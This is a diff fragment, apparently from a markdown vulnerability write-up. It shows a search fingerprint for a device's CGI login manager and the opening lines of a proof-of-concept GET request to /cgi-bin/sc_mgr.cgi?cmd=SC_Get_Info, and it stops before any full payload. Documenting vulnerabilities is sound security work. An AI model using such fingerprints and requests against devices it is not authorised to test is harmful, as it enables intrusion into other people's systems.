@@ -8,7 +8,7 @@ body="/cgi-bin/login_mgr.cgi"  &&  body="cmd=cgi_get_ssl_info"
 
 ![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1731336110353-da817235-136a-49bd-9e02-241d826321d4.png)
 
-## poc
+## POC
 ```java
 GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
 Host: 
